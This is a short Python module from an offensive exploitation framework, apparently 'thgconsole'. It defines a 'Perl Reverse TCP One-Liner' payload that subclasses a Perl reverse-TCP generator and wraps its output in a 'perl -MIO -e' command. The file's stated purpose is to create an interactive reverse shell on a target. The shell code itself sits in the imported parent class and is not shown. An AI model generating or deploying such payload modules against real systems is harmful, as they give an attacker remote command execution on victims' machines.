from thgconsole.core.exploit import *
from thgconsole.modules.payloads.perl.reverse_tcp import Payload as PerlReverseTCP


class Payload(PerlReverseTCP):
    __info__ = {
        "name": "Perl Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using perl one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thgconsole module
        ),
    }

    cmd = OptString("perl", "Perl binary")

    def generate(self):
        self.fmt = self.cmd + " -MIO -e \"{}\""
        payload = super(Payload, self).generate()
        return payload
